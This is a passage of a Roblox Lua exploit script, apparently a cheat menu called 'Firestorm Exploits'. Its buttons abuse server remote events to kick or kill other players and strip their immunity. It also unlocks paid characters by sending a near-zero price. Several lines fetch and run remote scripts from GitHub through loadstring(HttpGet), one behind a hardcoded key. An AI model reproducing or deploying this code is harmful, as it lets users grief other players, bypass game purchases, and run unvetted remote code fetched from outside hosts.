    [1] = game:GetService("Players")[player.Name..""].Character:WaitForChild("Channeled")
}

game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))
end

end)

BennettSection:NewTextBox("Gods immunity", "", function(txt)
    local Players = game:GetService("Players")
    local msg = txt
    local function findPlayer(stringg)
        for _, v in pairs(Players:GetPlayers()) do
            if stringg:lower() == (v.Name:lower()):sub(1, #stringg) then
                return v
            end
        end
    end

    local player = findPlayer(msg)
    local CHAR = player.Character
    

bennettscripts = {
    [1] = player.Character.Immune
}
game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))


end)

BennettSection:NewTextBox("Rip Immunity", "", function(txt)
    local Players = game:GetService("Players")
    local msg = txt
    local function findPlayer(stringg)
        for _, v in pairs(Players:GetPlayers()) do
            if stringg:lower() == (v.Name:lower()):sub(1, #stringg) then
                return v
            end
        end
    end

    local player = findPlayer(msg)
    local CHAR = player.Character
    

bennettscripts = {
    [1] = player.Character.Stats.Gamepass
}
game:GetService("Players").LocalPlayer.Backpack.Salt.Event:FireServer(unpack(bennettscripts))



end)
local BennettSection = Bennett:NewSection("Target Character")

BennettSection:NewTextBox("Teleport to character", "", function(char)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer


local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local statsFolder = player.Character and player.Character:FindFirstChild("Stats")
            if statsFolder then
                local characterNameValue = statsFolder:FindFirstChild("CharacterName")
                if characterNameValue and characterNameValue:IsA("StringValue") then
                    if characterNameValue.Value == char then
                        return player
                    end
                end
            end
        end
    end
    return nil
end

local function teleportLocalPlayerToTargetPlayer()
    local targetPlayer = findTargetPlayer()
    if targetPlayer then
        local targetCharacter = targetPlayer.Character
        if targetCharacter then
            local targetPosition = targetCharacter:GetModelCFrame().Position
            LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
        else
            warn("Target player's character not found.")
        end
    else
        warn("Target player not found.")
game.StarterGui:SetCore("SendNotification", { 
    Title = "Character not found!";
    Text = "This character isn't in game";
    Icon = "rbxthumb://type=Asset&id=17084408794&w=150&h=150";
    Duration = "2";
    Button1 = "Close";
})

    end
end

teleportLocalPlayerToTargetPlayer()
end)

BennettSection:NewTextBox("View character", "", function(char)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = game:GetService("Workspace").CurrentCamera


local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Stats") then
            local statsFolder = player.Character.Stats
            local characterNameValue = statsFolder:FindFirstChild("CharacterName")
            if characterNameValue and characterNameValue:IsA("StringValue") and characterNameValue.Value == char then
                return player
            end
        end
    end
    return nil
end

local function viewTargetPlayer()
    local targetPlayer = findTargetPlayer()
    if targetPlayer then
        local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
        if targetHumanoid then
            Camera.CameraType = Enum.CameraType.Custom
            Camera.CameraSubject = targetHumanoid
        else
            warn("Target player's humanoid not found.")
        end
    else
        warn("Target player not found")
game.StarterGui:SetCore("SendNotification", { 
    Title = "Character not found!";
    Text = "This character isn't in game";
    Icon = "rbxthumb://type=Asset&id=17084408794&w=150&h=150";
    Duration = "2";
    Button1 = "Close";
})
    end
end


local function viewTarget()
    viewTargetPlayer()
end

viewTarget()

end)

BennettSection:NewButton("Unview", "", function()

local Camera = game:GetService("Workspace").CurrentCamera
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function unviewTarget()
    Camera.CameraType = Enum.CameraType.Custom
    Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
end

unviewTarget()


end)

BennettSection:NewTextBox("Heal character", "", function(char)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("Stats") then
            local characterNameValue = player.Character.Stats:FindFirstChild("CharacterName")
            if characterNameValue and characterNameValue:IsA("StringValue") and characterNameValue.Value == char then
                return player
            end
        end
    end
    return nil
end

local function teleportToLocalPlayerToTarget(targetPlayer)
    if targetPlayer then
        LocalPlayer.Character:SetPrimaryPartCFrame(targetPlayer.Character.HumanoidRootPart.CFrame)
    else
        warn("Target player not found or does not have the correct character name value.")
    end
end

local function callRemoteWithArgs(args)
    local spellEvent = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Action"):WaitForChild("SpellEvent")
    spellEvent:FireServer(unpack(args))
end

local function castSpell()
    local targetPlayer = findTargetPlayer()
    if targetPlayer then
        teleportToLocalPlayerToTarget(targetPlayer)
        wait(0.8)  
        
        local args = {
            [1] = "sanitatem", 
            [2] = targetPlayer.Character,
            [3] = CFrame.new(335.3482666015625, 10.283612251281738, 841.7147827148438, 0.9970464110374451, 0.018316147848963737, -0.07458620518445969, -7.462174211880779e-10, 0.9711463451385498, 0.23848454654216766, 0.07680223882198334, -0.23778016865253448, 0.9682778716087341),
            [4] = targetPlayer.Character.UpperTorso
        }
        callRemoteWithArgs(args)
    else
        warn("Target player not found")
game.StarterGui:SetCore("SendNotification", { 
    Title = "Character not found!";
    Text = "This character isn't in game";
    Icon = "rbxthumb://type=Asset&id=17084408794&w=150&h=150";
    Duration = "2";
    Button1 = "Close";
})
    end
end

castSpell()


end)

BennettSection:NewTextBox("Kick character (salt)", "", function(char)

local Players = game:GetService("Players")

local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("Stats") then
            local characterNameValue = player.Character.Stats:FindFirstChild("CharacterName")
            if characterNameValue and characterNameValue:IsA("StringValue") and characterNameValue.Value == char then
                return player
            end
        end
    end
    return nil
end

local function callRemoteWithArgs(args)
    local spellEvent = game:GetService("Players").LocalPlayer.Backpack.Salt.Event
    spellEvent:FireServer(unpack(args))
end

local function castSpell()
    local targetPlayer = findTargetPlayer()
    if targetPlayer then

local args = {
    [1] = game.Players[targetPlayer.Name..""]
}

callRemoteWithArgs(args)

    else
        warn("Target player not found")
game.StarterGui:SetCore("SendNotification", { 
    Title = "Character not found!";
    Text = "This character isn't in game";
    Icon = "rbxthumb://type=Asset&id=17084408794&w=150&h=150";
    Duration = "2";
    Button1 = "Close";
})
    end
end

castSpell()

end)

BennettSection:NewTextBox("Kill character (salt)", "", function(char)

local Players = game:GetService("Players")

local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("Stats") then
            local characterNameValue = player.Character.Stats:FindFirstChild("CharacterName")
            if characterNameValue and characterNameValue:IsA("StringValue") and characterNameValue.Value == char then
                return player
            end
        end
    end
    return nil
end


local function callRemoteWithArgs(args)
    local spellEvent = game:GetService("Players").LocalPlayer.Backpack.Salt.Event
    spellEvent:FireServer(unpack(args))
end


local function castSpell()
    local targetPlayer = findTargetPlayer()
    if targetPlayer then
local args = {
    [1] = targetPlayer.Character.Head
}

callRemoteWithArgs(args)
    else
        warn("Target player not found")
game.StarterGui:SetCore("SendNotification", { 
    Title = "Character not found!";
    Text = "This character isn't in game";
    Icon = "rbxthumb://type=Asset&id=17084408794&w=150&h=150";
    Duration = "2";
    Button1 = "Close";
})
    end
end

castSpell()


end)

BennettSection:NewTextBox("delete characters rip immunity (salt)", "", function(char)

local Players = game:GetService("Players")

local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("Stats") then
            local characterNameValue = player.Character.Stats:FindFirstChild("CharacterName")
            if characterNameValue and characterNameValue:IsA("StringValue") and characterNameValue.Value == char then
                return player
            end
        end
    end
    return nil
end

local function callRemoteWithArgs(args)
    local spellEvent = game:GetService("Players").LocalPlayer.Backpack.Salt.Event
    spellEvent:FireServer(unpack(args))
end

local function castSpell()
    local targetPlayer = findTargetPlayer()
    if targetPlayer then
local args = {
    [1] = targetPlayer.Character.Stats.Gamepass
}

callRemoteWithArgs(args)
    else
        warn("Target player not found")
game.StarterGui:SetCore("SendNotification", { 
    Title = "Character not found!";
    Text = "This character isn't in game";
    Icon = "rbxthumb://type=Asset&id=17084408794&w=150&h=150";
    Duration = "2";
    Button1 = "Close";
})
    end
end


castSpell()

end)

BennettSection:NewTextBox("delete Gods immunity (salt)", "", function(char)

local Players = game:GetService("Players")

local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("Stats") then
            local characterNameValue = player.Character.Stats:FindFirstChild("CharacterName")
            if characterNameValue and characterNameValue:IsA("StringValue") and characterNameValue.Value == char then
                return player
            end
        end
    end
    return nil
end

local function callRemoteWithArgs(args)
    local spellEvent = game:GetService("Players").LocalPlayer.Backpack.Salt.Event
    spellEvent:FireServer(unpack(args))
end

local function castSpell()
    local targetPlayer = findTargetPlayer()
    if targetPlayer then
local args = {
    [1] = targetPlayer.Character.Stats.Gamepass
}

callRemoteWithArgs(args)

local args = {
    [1] = targetPlayer.Character.Immune
}

callRemoteWithArgs(args)

    else
        warn("Target player not found")
game.StarterGui:SetCore("SendNotification", { 
    Title = "Character not found!";
    Text = "This character isn't in game";
    Icon = "rbxthumb://type=Asset&id=17084408794&w=150&h=150";
    Duration = "2";
    Button1 = "Close";
})
    end
end

castSpell()

end)

local Bennett = BennettWindow:NewTab("Characters")
local BennettSection = Bennett:NewSection("Unlock characters")
BennettSection:NewButton("Alaric", "", function()
local ohString1 = "BuyChar"
local ohString2 = "Alaric"
local ohNumber3 = 1.1125369292536007e-308

game:GetService("ReplicatedStorage").Events.System.MenuMisc:FireServer(ohString1, ohString2, ohNumber3)
end)
BennettSection:NewButton("Davina", "", function()
local ohString1 = "BuyChar"
local ohString2 = "Davina"
local ohNumber3 = 1.1125369292536007e-308

game:GetService("ReplicatedStorage").Events.System.MenuMisc:FireServer(ohString1, ohString2, ohNumber3)
end)
BennettSection:NewButton("Cleo", "", function()
local ohString1 = "BuyChar"
local ohString2 = "Cleo"
local ohNumber3 = 1.1125369292536007e-308

game:GetService("ReplicatedStorage").Events.System.MenuMisc:FireServer(ohString1, ohString2, ohNumber3)
end)
BennettSection:NewButton("Esther", "", function()
local ohString1 = "BuyChar"
local ohString2 = "Esther"
local ohNumber3 = 1.1125369292536007e-308

game:GetService("ReplicatedStorage").Events.System.MenuMisc:FireServer(ohString1, ohString2, ohNumber3)
end)
BennettSection:NewButton("Mikael", "", function()
local ohString1 = "BuyChar"
local ohString2 = "Mikael"
local ohNumber3 = 1.1125369292536007e-308

game:GetService("ReplicatedStorage").Events.System.MenuMisc:FireServer(ohString1, ohString2, ohNumber3)
end)
local BennettSection = Bennett:NewSection("Witch")
BennettSection:NewButton("Genevieve", "", function()
local args = {
    [1] = "Genevieve",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewDropdown("Cleo (must own)", "", {"Outfit1", "Outfit2"}, function(currentOption)
                           local selectedOutfit;
                           selectedOutfit = currentOption;
                           if selectedOutfit then

local args = {
    [1] = "Cleo",
    [2] = selectedOutfit
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))





                           end
local oldList = {
  "Outfit1",
  "Outfit2"
}
local newList = {
  "Cleo (must own)"
}
                           wait(0.5)
                           dropdown:Refresh(newList)
    print(currentOption)
end)
BennettSection:NewButton("Davina (must own)", "", function()
local args = {
    [1] = "Davina",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Alyssa", "", function()
local args = {
    [1] = "Alyssa",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Sophie", "", function()
local args = {
    [1] = "Sophie",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Eva", "", function()
local args = {
    [1] = "Eva",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Liv", "", function()
local args = {
    [1] = "Liv",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewDropdown("Lizzie", "", {"Outfit1", "Outfit2", "Outfit3"}, function(currentOption)
                           local selectedOutfit;
                           selectedOutfit = currentOption;
                           if selectedOutfit then

local args = {
    [1] = "Lizzie",
    [2] = selectedOutfit
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))





                           end
local oldList = {
  "Outfit1",
  "Outfit2",
  "Outfit3"
}
local newList = {
  "Lizzie"
}
                           wait(0.5)
                           dropdown:Refresh(newList)
    print(currentOption)
end)
BennettSection:NewButton("Abigail", "", function()
local args = {
    [1] = "Abigail",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Sheila", "", function()
local args = {
    [1] = "Sheila",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Monique", "", function()
local args = {
    [1] = "Monique",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Cassie", "", function()
local args = {
    [1] = "Cassie",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewDropdown("Josie", "", {"Outfit1", "Outfit2"}, function(currentOption)
                           local selectedOutfit;
                           selectedOutfit = currentOption;
                           if selectedOutfit then

local args = {
    [1] = "Josie",
    [2] = selectedOutfit
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))





                           end
local oldList = {
  "Outfit1",
  "Outfit2"
}
local newList = {
  "Josie"
}
                           wait(0.5)
                           dropdown:Refresh(newList)
    print(currentOption)
end)
BennettSection:NewDropdown("Esther", "", {"Outfit1", "Outfit2", "Outfit3"}, function(currentOption)
                           local selectedOutfit;
                           selectedOutfit = currentOption;
                           if selectedOutfit then

local args = {
    [1] = "Esther",
    [2] = selectedOutfit
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))





                           end
local oldList = {
  "Outfit1",
  "Outfit2",
  "Outfit3"
}
local newList = {
  "Esther"
}
                           wait(0.5)
                           dropdown:Refresh(newList)
    print(currentOption)
end)
BennettSection:NewButton("Celeste", "", function()
local args = {
    [1] = "Celeste",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
local BennettSection = Bennett:NewSection("Vampire")
BennettSection:NewButton("Lexi", "", function()
local args = {
    [1] = "Lexi",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewDropdown("Caroline", "", {"Outfit1", "Outfit2"}, function(currentOption)
                           local selectedOutfit;
                           selectedOutfit = currentOption;
                           if selectedOutfit then

local args = {
    [1] = "Caroline",
    [2] = selectedOutfit
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))





                           end
local oldList = {
  "Outfit1",
  "Outfit2"
}
local newList = {
  "Caroline"
}
                           wait(0.5)
                           dropdown:Refresh(newList)
    print(currentOption)
end)
BennettSection:NewButton("Cami", "", function()
local args = {
    [1] = "Cami",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Aurora", "", function()
local args = {
    [1] = "Aurora",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Mikael (must own)", "", function()
local args = {
    [1] = "Mikael",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Damon", "", function()
local args = {
    [1] = "Damon",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewDropdown("Katherine", "", {"Outfit1", "Outfit2", "Outfit3"}, function(currentOption)
                           local selectedOutfit;
                           selectedOutfit = currentOption;
                           if selectedOutfit then

local args = {
    [1] = "Katherine",
    [2] = selectedOutfit
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))





                           end
local oldList = {
  "Outfit1",
  "Outfit2",
  "Outfit3"
}
local newList = {
  "Katherine"
}
                           wait(0.5)
                           dropdown:Refresh(newList)
    print(currentOption)
end)
BennettSection:NewButton("Sebastian", "", function()
local args = {
    [1] = "Sebastian",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Stefan", "", function()
local args = {
    [1] = "Stefan",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
local BennettSection = Bennett:NewSection("Heretic")
BennettSection:NewButton("Kai", "", function()
local args = {
    [1] = "Kai",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
local BennettSection = Bennett:NewSection("Hybrid")
BennettSection:NewButton("Hayley", "", function()
local args = {
    [1] = "Hayley",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewButton("Tyler", "", function()
local args = {
    [1] = "Tyler",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
local BennettSection = Bennett:NewSection("Mortal")
BennettSection:NewButton("Alaric", "", function()
local args = {
    [1] = "Alaric",
    [2] = "Outfit1"
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))
end)
BennettSection:NewDropdown("Elena", "", {"Outfit1", "Outfit2", "Outfit3"}, function(currentOption)
                           local selectedOutfit;
                           selectedOutfit = currentOption;
                           if selectedOutfit then

local args = {
    [1] = "Elena",
    [2] = selectedOutfit
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("System"):WaitForChild("Character"):FireServer(unpack(args))





                           end
local oldList = {
  "Outfit1",
  "Outfit2",
  "Outfit3"
}
local newList = {
  "Elena"
}
                           wait(0.5)
                           dropdown:Refresh(newList)
    print(currentOption)
end)
local Bennett = BennettWindow:NewTab("Misc")
local BennettSection = Bennett:NewSection("Misc")
BennettSection:NewButton("Infinite Yield", "", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Omg562/Scripts/main/INF'),true))()
end)
BennettSection:NewTextBox("key", "", function(Value)

if Value == "Bennett22" then

loadstring(game:HttpGet(('https://raw.githubusercontent.com/Bennett22/Ben-10/main/Spy'),true))()

end
end)

local Tab = BennettWindow:NewTab("Credits")
local SettingsSection = Tab:NewSection("Icicle And Fusion Development")

local SettingsSection = Tab:NewSection("Toggle UI")
SettingsSection:NewKeybind("Toggle UI", "Toggle UI", Enum.KeyCode.LeftAlt, function()
    Library:ToggleUI()
end)

wait(1)

game.StarterGui:SetCore("SendNotification", { 
    Title = "â›¤ Firestorm Exploits â›¤";
    Text = "TVO";
    Icon = "rbxthumb://type=Asset&id=14067496704&w=150&h=150";
    Duration = "2";
    Button1 = "Close";
})

if game:GetService("Players").LocalPlayer.UserId == 3185912033 then

    game.Players.LocalPlayer:Kick("Blacklisted xoxoxo")

end

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

local button = Instance.new("TextButton")
button.Name = "PurpleButton"
button.Text = "Toggle UI"
button.AnchorPoint = Vector2.new(1, 0)
button.Position = UDim2.new(1, -10, 0, 10) -- Top right corner with a small margin
button.Size = UDim2.new(0, 100, 0, 50) -- Adjust size as needed
button.BackgroundColor3 = Color3.fromRGB(107, 98, 155) -- Purple color
button.TextColor3 = Color3.new(1, 1, 1) -- White text color
button.Parent = screenGui

local function ButtonClicked()
    print("Button clicked!")
     Library:ToggleUI()
end

button.MouseButton1Click:Connect(ButtonClicked)

loadstring(game:HttpGet('https://raw.githubusercontent.com/ColaCydiaRepo/Scripts/main/hello%20world.html'))()